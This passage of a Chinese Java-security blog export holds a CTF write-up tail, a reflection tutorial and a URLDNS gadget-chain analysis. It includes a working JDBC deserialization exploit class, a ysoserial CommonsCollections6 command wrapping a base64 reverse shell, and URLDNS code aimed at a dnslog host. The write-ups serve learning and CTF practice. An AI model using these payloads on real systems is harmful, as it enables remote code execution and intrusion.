<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">反序列化-&gt;info.getAllinfo()-&gt;(动态代理)InfoInvocationHandler.invoke()-&gt;Databaseinfo.checkAllInfo()-&gt;Databaseinfo-&gt;connect()<br></code></pre></td></tr></table></figure>

<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">DatabaseInfo</span> <span class="hljs-variable">databaseinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseInfo</span>();<br>        databaseinfo.setHost(<span class="hljs-string">&quot;JDBC恶意服务器地址&quot;</span>);<br>        databaseinfo.setPort(<span class="hljs-string">&quot;JDBC恶意服务器端口&quot;</span>);<br>        databaseinfo.setUsername(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-comment">//JDBC-Mysql 8.0.19 payload</span><br>        databaseinfo.setPassword(<span class="hljs-string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);<br><br><br>        <span class="hljs-type">InfoInvocationHandler</span> <span class="hljs-variable">infoInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoInvocationHandler</span>(databaseinfo);<br>        Info info=(Info) Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(info);<br>        objectOutputStream.close();<br><br>        String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.println(str);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用ysoserial生成反弹shell的CC链，JDBC恶意服务器可以看这篇文章<a href="https://xz.aliyun.com/news/7754#toc-0">小白看得懂的MySQL JDBC 反序列化漏洞分析</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar CommonsCollections6 <span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; a<br></code></pre></td></tr></table></figure>



<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172315694.png" alt="image-20250218172315694"></p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172759801.png" alt="image-20250218172759801"></p>
<h2 id="坑点与总结-1"><a href="#坑点与总结-1" class="headerlink" title="坑点与总结"></a>坑点与总结</h2><p>坑点：做题时，类的包名要和题目jar中的包名一致，不然会导致反序列化找不到类失败。</p>
<p>题目主要考察对<strong>动态代理</strong>的理解和<strong>JDBC反序列化</strong>，推荐观看组长对动态代理的讲解<a href="https://www.bilibili.com/video/BV16h411z7o9?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=3">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h2 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h2><p>反射是一种间接操作目标对象的机制，允许程序在运行时获取类的信息，并且在运行时动态地创建对象、调用方法、访问字段等等；<strong>对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法&#x2F;访问属性。</strong></p>
<hr>
<p>实质就是得到一个Class对象后，反向获取Class对象的对象。</p>
<h2 id="Class类、Class对象与class关键字"><a href="#Class类、Class对象与class关键字" class="headerlink" title="Class类、Class对象与class关键字"></a>Class类、Class对象与class关键字</h2><p><code>Class类</code>是java中的一个类，位于<strong>java.lang</strong>包中。它提供了用于获取类信息和操作类或对象的属性和方法的方法。<img src="https://image.sp4rks.xyz/2024/06/image-20240514205516919.png" alt="image-20240514205516919"></p>
<p><code>Class对象</code>是JVM在运行时保留的每个类的描述信息。Class对象包含了该类的所有信息，包括类的名称、属性、方法、构造函数等。Class对象可以通过Class类的各种方法获取。</p>
<p><code>class</code>是java的关键字，用于声明类。</p>
<hr>
<p><strong>对Class类解读:</strong></p>
<p>我们通常认为类是对象的抽象和集合，Class就相当于是对类的抽象和集合。<br>也可以认为对象是类的实例，类是Class的实例。</p>
<h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><p>通常有以下几种方法获取一个类的Class对象</p>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;Test&quot;</span>);     如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取<br></code></pre></td></tr></table></figure>

<h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; bClass = Test.class;    如果已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就可以直接拿它的class属性。<br></code></pre></td></tr></table></figure>

<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Test cClass= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Test</span>&gt; aClass1 = cClass.getClass();  如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240514215718317.png" alt="image-20240514215718317"></p>
<p>但在这三种获取CLass类方式中，我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。</p>
<h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><p>获取到Class之后，实例化对象，<code>newInstance()</code>方法调用无参的构造器创建对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090748055.png" alt="image-20240516090748055"></p>
<p>(<strong>Class</strong>类中的<code>newInstance()</code>方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102707921.png" alt="image-20240516102707921"></p>
<p><code>java.lang.relect.Constructor</code>类里也有一个<code>newInstance()</code>方法可以创建对象，该方法和Class类中的<code>newInstance()</code>方法很像，但是相比之下，Constructor类的<code>newInstance()</code>方法更加强大，我们可以通过这个<code>newInstance()</code>方法调用有参数的和私有的构造方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102944537.png" alt="image-20240516102944537"></p>
<p>这时有个问题，比如一个类有很多的构造方法，我们怎么能找到我们想要的构造方法呢？我们可以使用<code>getConstructor()</code>,它根据提供的参数类型来定位特定的构造函数。可以从<code>getConstructor()</code>的函数声明中看到，参数类型是Class可变长参数。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516094652144.png" alt="image-20240516094652144"></p>
<p>因为Test类中有两个属性，<strong>Sting name</strong>和<strong>int age</strong>，<code>getConstructor()</code>填入<strong>String.class</strong>和<strong>int.class</strong>,发现报错了，报错信息提示没有这个方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091359629.png" alt="image-20240516091359629"></p>
<p>可以看到Test类中<strong>age</strong>属性是私有的，这时使用<code>getDeclaredConstructor()</code>方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090723742.png" alt="image-20240516090723742"></p>
<p>设置访问权限为true。就可以通过有参构造函数实例化对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091419131.png" alt="image-20240516091419131"></p>
<h2 id="获取类的属性"><a href="#获取类的属性" class="headerlink" title="获取类的属性"></a>获取类的属性</h2><p>通过<code>getFields()</code>可以获取属性，但是发现这里只获取了name，age并没有被获取，原因其实和上面类似，必须用<code>getDeclaredFields()</code>并设置访问权限。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095310090.png" alt="image-20240516095310090"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095330837.png" alt="image-20240516095330837"> </p>
<p><code>set()</code>方法通常和<code>getField()</code>搭配使用,<code>set()</code>方法是<code>Field</code>类的一部分，用于通过反射机制设置对象的字段值，具体一点就是<code>Field</code>对象表示类中的一个成员变量，<code>set()</code>方法允许修改这个字段的值，即使该字段是私有的。在使用之前，通常需要调用<code>setAccessible(true)</code>来绕过Java的访问控制检查。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516101853830.png" alt="image-20240516101853830"></p>
<p><strong>age</strong>属性是私有的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102050549.png" alt="image-20240516102050549"></p>
<p>（通过<code>getDeclaredField()</code>设置访问权限）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102124715.png" alt="image-20240516102124715"></p>
<h2 id="调用类的方法"><a href="#调用类的方法" class="headerlink" title="调用类的方法"></a>调用类的方法</h2><p>Test类有public Hello方法和Private prHello方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113808489.png" alt="image-20240516113808489"></p>
<p>通过<code>getMethods()</code>可以获取公共方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112756232.png" alt="image-20240516112756232"></p>
<p>通过<code>getDeclaredMethods()</code>可以获取公共方法和私有方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112826908.png" alt="image-20240516112826908"></p>
<p><code>getMethod()</code>通常和<code>invoke()</code>搭配，<code>invoke()</code>可以动态地在运行时调用对象的方法。其实也不难理解，我们通过<code>getMethod()</code>反射获得一个方法后，肯定需要指定是哪个类，并且指明执行的参数。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516131226025.png" alt="image-20240516131226025"></p>
<p>用<code>getMethod()</code>调用一下Test类中的<code>Hello()</code>方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130413038.png" alt="image-20240516130413038"></p>
<p>(Class类中的<code>getMethod()</code>方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113750554.png" alt="image-20240516113750554"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130817172.png" alt="image-20240516130817172"></p>
<h2 id="小练习，反射弹计算器"><a href="#小练习，反射弹计算器" class="headerlink" title="小练习，反射弹计算器"></a>小练习，反射弹计算器</h2><p>正常情况下咱们弹计算器<img src="https://image.sp4rks.xyz/2024/06/image-20240516133359336.png" alt="image-20240516133359336"></p>
<p>反射写法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516141618708.png" alt="image-20240516141618708"></p>
<p>因为 <code>getRuntime()</code>是静态方法，属于类，所以<code>getRuntime.invoke()</code>;不需要指定对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516143222774.png" alt="image-20240516143222774"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><br>        <span class="hljs-comment">//获取Runtime 类的 Class 对象</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">//获取 Runtime 类中名为 getRuntime 的方法的引用</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//getMethod() 方法获取 exec 方法的引用</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-comment">//用 invoke() 方法调用 exec</span><br>        exec.invoke(runtimeInstance, <span class="hljs-string">&quot;calc&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVA反射</a></p>
<p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">java反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVA反序列化 - 反射机制</a></p>
<p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVA安全基础（二）– 反射机制</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>RULDNS链</title>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ol>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p>
<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p>
<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p>
<p>进入<code>getHostAddress()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p>
<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
<p><strong>流程</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p>
<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p>
<p>如果一切顺利的话</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>

<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p>
<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p>
<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p>
<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//思路</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//将hashCode值改为-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//实现</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//新建一个hashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//获取一个Class</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//获取hashCode字段</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//设置字段访问权限</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>);	 <span class="hljs-comment">//将hashCode改为123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//put完后改为-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//序列化</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="hljs-comment">//反序列化</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">为什么hashMap要实现自己的writeObject和readObject方法</a></p>
<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Java反序列化基础篇-01-反序列化概念与利用</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
</search>
